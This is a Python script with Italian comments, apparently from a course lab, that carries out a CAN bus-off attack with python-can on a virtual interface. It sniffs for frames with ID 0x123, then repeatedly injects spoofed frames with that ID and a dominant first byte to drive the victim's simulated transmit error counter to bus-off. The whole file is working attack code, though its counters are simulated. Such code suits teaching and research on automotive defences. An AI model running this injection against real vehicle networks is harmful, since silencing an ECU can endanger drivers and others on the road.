import can
import time
import random
import threading
import sys

# --- CONFIGURAZIONE ---
CAN_INTERFACE = 'vcan0'
TARGET_ID = 0x123 
ATTACK_PERIOD_SEC = 5.0
BUS_OFF_THRESHOLD = 256
TEC_PASSIVE_THRESHOLD = 128
INITIAL_TEC = 0
# ----------------------

def start_attacker_realistic():
    
    try:
        bus = can.interface.Bus(channel=CAN_INTERFACE, bustype='socketcan')
        print(f"✅ [Attaccante] Connesso a {CAN_INTERFACE}.")
    except OSError as e:
        print(f"❌ [Attaccante] Errore di connessione: {e}")
        return

    # --- FASE 1: SINCRONIZZAZIONE (SNIFFING) ---
    print(f"\n🔍 [Attaccante] FASE 1: In attesa del primo messaggio della Vittima (ID: {hex(TARGET_ID)}) per sincronizzare...")
    
    msg = None
    while msg is None or msg.arbitration_id != TARGET_ID:
        msg = bus.recv(timeout=1.0)
        if msg is not None and msg.arbitration_id != TARGET_ID:
             continue
        if msg is None:
             print("...sniffing in corso...")

    print(f"✅ [Attaccante] Sincronizzato! Ricevuto il primo messaggio a {time.strftime('%H:%M:%S')}")
    
    # --- FASE 2: ATTACCO TEMPORIZZATO con TEC SIMULATO ---
    # La Vittima (V) e l'Attaccante (A) mantengono la propria versione del TEC SIMULATO
    victim_tec_sim = INITIAL_TEC 
    adversary_tec_sim = INITIAL_TEC
    attack_counter = 0

    print("\n--- FASE 2: ATTACCO BUS-OFF AVVIATO (Logica Teorica) ---")

    while victim_tec_sim < BUS_OFF_THRESHOLD:
        
        # 1. Calcolo del TEC simulato (logica delle slide: V=+8/+7, A=+8/-1)
        if victim_tec_sim < TEC_PASSIVE_THRESHOLD:
            victim_tec_change, adversary_tec_change = 8, 8
            fase_desc = "Fase 1 (Active)"
        else:
            victim_tec_change, adversary_tec_change = 7, -1 
            fase_desc = "Fase 2 (Passive)"
        
        victim_tec_sim += victim_tec_change
        adversary_tec_sim += adversary_tec_change
        
        # 2. Stampa e Controllo Attaccante
        print(f"\n--- CICLO ATTACCANTE #{attack_counter+1} ({time.strftime('%H:%M:%S')}) ---")
        print(f"[{fase_desc}] TEC Sim: V={victim_tec_sim} ({victim_tec_change:+d}), A={adversary_tec_sim} ({adversary_tec_change:+d})")

        if adversary_tec_sim >= BUS_OFF_THRESHOLD:
            print("🚨🚨 [Attaccante] BUS OFF RILEVATO! L'attaccante si auto-disattiva. Interrompo l'attacco.")
            break
        
        # 3. Iniezione del messaggio malevolo
        try:
            # FRAME D'ATTACCO REALISTICO: Stesso ID, dati modificati
            # Assicuriamo un bit dominante (0) all'inizio del campo dati/controllo
            # per garantire la condizione C3 di conflitto.
            
            # Un frame d'attacco realistico potrebbe essere dati tutti a zero (dominante)
            # o solo il primo byte a 0x00 e il resto casuale.
            
            random_data = [random.randint(0, 255) for _ in range(7)]
            attack_data = [0x00] + random_data # Primo byte dominante (0) per massimizzare il conflitto
            
            msg_attack = can.Message(
                arbitration_id=TARGET_ID,
                data=attack_data, 
                is_extended_id=False
            )
            bus.send(msg_attack)
            print(f"💣 [Attaccante] Messaggio malevolo iniettato. Attesa {ATTACK_PERIOD_SEC}s...")
            
        except can.CanError:
            break

        attack_counter += 1
        time.sleep(ATTACK_PERIOD_SEC) 
        
    # L'Attaccante si ferma qui se la Vittima ha raggiunto il Bus Off teorico.
    print(f"\n🎉 [Attaccante] La Vittima ha raggiunto Bus Off Teorico (TEC={victim_tec_sim}). L'attaccante si disattiva.")
    bus.shutdown()
    print("\n🛑 [Attaccante] Disconnesso.")

if __name__ == '__main__':
    start_attacker_realistic()
